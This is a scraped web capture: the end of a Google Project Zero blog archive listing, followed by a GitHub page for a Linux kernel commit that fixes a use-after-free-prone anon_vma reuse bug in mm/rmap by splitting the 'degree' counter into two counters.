    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from github.com_94f7826c_20250115_101104.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2555283eb40df89945557273121e9393ef9b542b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2555283eb40df89945557273121e9393ef9b542b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.8k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  434](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/2555283eb40df89945557273121e9393ef9b542b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

mm/rmap: Fix anon\_vma->degree ambiguity leading to double-reuse

[Browse files](/torvalds/linux/tree/2555283eb40df89945557273121e9393ef9b542b)
Browse the repository at this point in the history

```
anon_vma->degree tracks the combined number of child anon_vmas and VMAs
that use the anon_vma as their ->anon_vma.

anon_vma_clone() then assumes that for any anon_vma attached to
src->anon_vma_chain other than src->anon_vma, it is impossible for it to
be a leaf node of the VMA tree, meaning that for such VMAs ->degree is
elevated by 1 because of a child anon_vma, meaning that if ->degree
equals 1 there are no VMAs that use the anon_vma as their ->anon_vma.

This assumption is wrong because the ->degree optimization leads to leaf
nodes being abandoned on anon_vma_clone() - an existing anon_vma is
reused and no new parent-child relationship is created.  So it is
possible to reuse an anon_vma for one VMA while it is still tied to
another VMA.

This is an issue because is_mergeable_anon_vma() and its callers assume
that if two VMAs have the same ->anon_vma, the list of anon_vmas
attached to the VMAs is guaranteed to be the same.  When this assumption
is violated, vma_merge() can merge pages into a VMA that is not attached
to the corresponding anon_vma, leading to dangling page->mapping
pointers that will be dereferenced during rmap walks.

Fix it by separately tracking the number of child anon_vmas and the
number of VMAs using the anon_vma as their ->anon_vma.

Fixes: [7a3ef20](https://github.com/torvalds/linux/commit/7a3ef208e662f4b63d43a23f61a64a129c525bbc) ("mm: prevent endless growth of anon_vma hierarchy")
Cc: stable@kernel.org
Acked-by: Michal Hocko <mhocko@suse.com>
Acked-by: Vlastimil Babka <vbabka@suse.cz>
Signed-off-by: Jann Horn <jannh@google.com>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
```

* Loading branch information

[![@thejh](https://avatars.githubusercontent.com/u/499370?s=40&v=4)](/thejh) [![@torvalds](https://avatars.githubusercontent.com/u/1024025?s=40&v=4)](/torvalds)

[thejh](/torvalds/linux/commits?author=thejh "View all commits by thejh")
authored and
[torvalds](/torvalds/linux/commits?author=torvalds "View all commits by torvalds")
committed
Aug 31, 2022

1 parent
[c5e4d5e](/torvalds/linux/commit/c5e4d5e99162ba8025d58a3af7ad103f155d2df7)

commit 2555283

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**21 additions**
and
**15 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/linux

  + include/linux/rmap.h
    [rmap.h](#diff-8b1639a89d0400e063be4d9b27596c7f0e50f9819ddaa06c764da735b51a6f73)
* mm

  + mm/rmap.c
    [rmap.c](#diff-7a725988ca5f68a4709aa7ce6d004d7d87eb446e1b818e96bcb8c74fd3960acf)

## There are no files selected for viewing

7 changes: 5 additions & 2 deletions

7
[include/linux/rmap.h](#diff-8b1639a89d0400e063be4d9b27596c7f0e50f9819ddaa06c764da735b51a6f73 "include/linux/rmap.h")

Show comments

[View file](/torvalds/linux/blob/2555283eb40df89945557273121e9393ef9b542b/include/linux/rmap.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -41,12 +41,15 @@ struct anon\_vma { |
|  |  | atomic\_t refcount; |
|  |  |  |
|  |  | /\* |
|  |  | \* Count of child anon\_vmas and VMAs which points to this anon\_vma. |
|  |  | \* Count of child anon\_vmas. Equals to the count of all anon\_vmas that |
|  |  | \* have ->parent pointing to this one, including itself. |
|  |  | \* |
|  |  | \* This counter is used for making decision about reusing anon\_vma |
|  |  | \* instead of forking new one. See comments in function anon\_vma\_clone. |
|  |  | \*/ |
|  |  | unsigned degree; |
|  |  | unsigned long num\_children; |
|  |  | /\* Count of VMAs whose ->anon\_vma pointer points to this object. \*/ |
|  |  | unsigned long num\_active\_vmas; |
|  |  |  |
|  |  | struct anon\_vma \*parent; /\* Parent of this anon\_vma \*/ |
|  |  |  |
| Expand Down | |  |

29 changes: 16 additions & 13 deletions

29
[mm/rmap.c](#diff-7a725988ca5f68a4709aa7ce6d004d7d87eb446e1b818e96bcb8c74fd3960acf "mm/rmap.c")

Show comments

[View file](/torvalds/linux/blob/2555283eb40df89945557273121e9393ef9b542b/mm/rmap.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -93,7 +93,8 @@ static inline struct anon\_vma \*anon\_vma\_alloc(void) |
|  |  | anon\_vma = kmem\_cache\_alloc(anon\_vma\_cachep, GFP\_KERNEL); |
|  |  | if (anon\_vma) { |
|  |  | atomic\_set(&anon\_vma->refcount, 1); |
|  |  | anon\_vma->degree = 1; /\* Reference for first vma \*/ |
|  |  | anon\_vma->num\_children = 0; |
|  |  | anon\_vma->num\_active\_vmas = 0; |
|  |  | anon\_vma->parent = anon\_vma; |
|  |  | /\* |
|  |  | \* Initialise the anon\_vma root to point to itself. If called |
| Expand Down  Expand Up | | @@ -201,6 +202,7 @@ int \_\_anon\_vma\_prepare(struct vm\_area\_struct \*vma) |
|  |  | anon\_vma = anon\_vma\_alloc(); |
|  |  | if (unlikely(!anon\_vma)) |
|  |  | goto out\_enomem\_free\_avc; |
|  |  | anon\_vma->num\_children++; /\* self-parent link for new root \*/ |
|  |  | allocated = anon\_vma; |
|  |  | } |
|  |  |  |
| Expand All | | @@ -210,8 +212,7 @@ int \_\_anon\_vma\_prepare(struct vm\_area\_struct \*vma) |
|  |  | if (likely(!vma->anon\_vma)) { |
|  |  | vma->anon\_vma = anon\_vma; |
|  |  | anon\_vma\_chain\_link(vma, avc, anon\_vma); |
|  |  | /\* vma reference or self-parent link for new root \*/ |
|  |  | anon\_vma->degree++; |
|  |  | anon\_vma->num\_active\_vmas++; |
|  |  | allocated = NULL; |
|  |  | avc = NULL; |
|  |  | } |
| Expand Down  Expand Up | | @@ -296,19 +297,19 @@ int anon\_vma\_clone(struct vm\_area\_struct \*dst, struct vm\_area\_struct \*src) |
|  |  | anon\_vma\_chain\_link(dst, avc, anon\_vma); |
|  |  |  |
|  |  | /\* |
|  |  | \* Reuse existing anon\_vma if its degree lower than two, |
|  |  | \* that means it has no vma and only one anon\_vma child. |
|  |  | \* Reuse existing anon\_vma if it has no vma and only one |
|  |  | \* anon\_vma child. |
|  |  | \* |
|  |  | \* Do not choose parent anon\_vma, otherwise first child |
|  |  | \* will always reuse it. Root anon\_vma is never reused: |
|  |  | \* Root anon\_vma is never reused: |
|  |  | \* it has self-parent reference and at least one child. |
|  |  | \*/ |
|  |  | if (!dst->anon\_vma && src->anon\_vma && |
|  |  | anon\_vma != src->anon\_vma && anon\_vma->degree < 2) |
|  |  | anon\_vma->num\_children < 2 && |
|  |  | anon\_vma->num\_active\_vmas == 0) |
|  |  | dst->anon\_vma = anon\_vma; |
|  |  | } |
|  |  | if (dst->anon\_vma) |
|  |  | dst->anon\_vma->degree++; |
|  |  | dst->anon\_vma->num\_active\_vmas++; |
|  |  | unlock\_anon\_vma\_root(root); |
|  |  | return 0; |
|  |  |  |
| Expand Down  Expand Up | | @@ -358,6 +359,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) |
|  |  | anon\_vma = anon\_vma\_alloc(); |
|  |  | if (!anon\_vma) |
|  |  | goto out\_error; |
|  |  | anon\_vma->num\_active\_vmas++; |
|  |  | avc = anon\_vma\_chain\_alloc(GFP\_KERNEL); |
|  |  | if (!avc) |
|  |  | goto out\_error\_free\_anon\_vma; |
| Expand All | | @@ -378,7 +380,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) |
|  |  | vma->anon\_vma = anon\_vma; |
|  |  | anon\_vma\_lock\_write(anon\_vma); |
|  |  | anon\_vma\_chain\_link(vma, avc, anon\_vma); |
|  |  | anon\_vma->parent->degree++; |
|  |  | anon\_vma->parent->num\_children++; |
|  |  | anon\_vma\_unlock\_write(anon\_vma); |
|  |  |  |
|  |  | return 0; |
| Expand Down  Expand Up | | @@ -410,15 +412,15 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) |
|  |  | \* to free them outside the lock. |
|  |  | \*/ |
|  |  | if (RB\_EMPTY\_ROOT(&anon\_vma->rb\_root.rb\_root)) { |
|  |  | anon\_vma->parent->degree--; |
|  |  | anon\_vma->parent->num\_children--; |
|  |  | continue; |
|  |  | } |
|  |  |  |
|  |  | list\_del(&avc->same\_vma); |
|  |  | anon\_vma\_chain\_free(avc); |
|  |  | } |
|  |  | if (vma->anon\_vma) { |
|  |  | vma->anon\_vma->degree--; |
|  |  | vma->anon\_vma->num\_active\_vmas--; |
|  |  |  |
|  |  | /\* |
|  |  | \* vma would still be needed after unlink, and anon\_vma will be prepared |
| Expand All | | @@ -436,7 +438,8 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) |
|  |  | list\_for\_each\_entry\_safe(avc, next, &vma->anon\_vma\_chain, same\_vma) { |
|  |  | struct anon\_vma \*anon\_vma = avc->anon\_vma; |
|  |  |  |
|  |  | VM\_WARN\_ON(anon\_vma->degree); |
|  |  | VM\_WARN\_ON(anon\_vma->num\_children); |
|  |  | VM\_WARN\_ON(anon\_vma->num\_active\_vmas); |
|  |  | put\_anon\_vma(anon\_vma); |
|  |  |  |
|  |  | list\_del(&avc->same\_vma); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2555283`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2555283eb40df89945557273121e9393ef9b542b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


